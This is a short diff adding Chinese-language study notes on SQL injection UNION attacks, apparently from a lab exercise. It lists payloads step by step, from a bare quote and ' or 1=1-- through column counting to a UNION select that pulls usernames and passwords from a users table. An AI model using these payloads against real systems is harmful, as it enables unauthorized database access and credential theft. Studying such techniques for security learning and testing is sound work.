@@ -1,0 +1,11 @@
+SQL 注入 UNION 攻击，从其他表中检索数据:
+
+'
+'--
+' or 1=1--
+' order by 3--
+' Union select null, 'a', 'b'--
+
+原始查询返回两列，两列都可以容纳字符串数据
+1列对1列
+' Union select username, password from users--	
